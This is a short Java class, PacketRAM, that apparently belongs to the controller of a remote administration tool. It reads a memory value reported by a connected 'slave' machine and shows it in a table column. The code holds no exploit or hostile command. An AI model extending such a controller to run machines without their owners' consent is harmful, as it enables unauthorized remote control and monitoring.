package com.redpois0n.packets;

import com.redpois0n.Slave;
import com.redpois0n.ui.frames.Frame;
import com.redpois0n.utils.Util;

public class PacketRAM extends AbstractPacket {

	@Override
	public void read(Slave slave, String line) throws Exception {
		short ram = slave.readShort();
		slave.setRam(ram);
		
		int row = Util.getRow(slave);
		
		Frame.mainModel.setValueAt(ram + " mb", row, 7);
	}

}
